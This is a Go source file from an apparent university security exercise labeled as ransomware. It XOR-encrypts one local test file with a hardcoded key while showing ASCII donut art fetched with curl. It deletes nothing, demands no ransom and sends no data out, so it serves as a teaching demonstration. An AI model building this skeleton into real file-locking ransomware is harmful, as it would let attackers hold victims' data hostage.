package main

import (
	"fmt"
	"io/ioutil"
	"os"

	"ransomware/donut"
	"ransomware/encrypt"
)

func main() {
	// Crea una nueva terminal
	terminal := donut.NewTerminal()
	defer terminal.Close()

	// Canal para coordinar la finalización de la encriptación
	done := make(chan struct{})

	// Goroutine para mostrar el arte ASCII de un donut
	go func() {
		err := terminal.RunCommand("curl", "ascii.live/donut")
		if err != nil {
			fmt.Println("Error ejecutando el comando:", err)
			os.Exit(1)
		}
	}()

	// Goroutine para encriptar el archivo
	go func() {
		defer close(done)

		inputPath := "test.txt"
		outputPath := "test_encrypted.txt"
		key := []byte("seguridad_informatica_UAO")

		// Leer archivo de entrada
		data, err := ioutil.ReadFile(inputPath)
		if err != nil {
			fmt.Println("Error al leer el archivo:", err)
			os.Exit(1)
		}

		// Encriptar datos
		encryptedData, err := encrypt.BitwiseEncrypt(data, key)
		if err != nil {
			fmt.Println("Error al encriptar el archivo:", err)
			os.Exit(1)
		}

		// Escribir archivo encriptado
		err = ioutil.WriteFile(outputPath, encryptedData, 0644)
		if err != nil {
			fmt.Println("Error al escribir el archivo encriptado:", err)
			os.Exit(1)
		}

		fmt.Println("Archivo encriptado correctamente.")
	}()

	// Espera hasta que la encriptación haya finalizado
	<-done
	// Detiene la ejecución de la dona en la terminal
	fmt.Println("Programa terminado.")
	os.Exit(0)
}

// Función para encriptar datos bit a bit con XOR
func BitwiseEncrypt(data []byte, key []byte) ([]byte, error) {
	encrypted := make([]byte, len(data))
	keyLen := len(key)
	for i, b := range data {
		encrypted[i] = b ^ key[i%keyLen] // XOR con la clave, repetida cíclicamente
	}
	return encrypted, nil
}
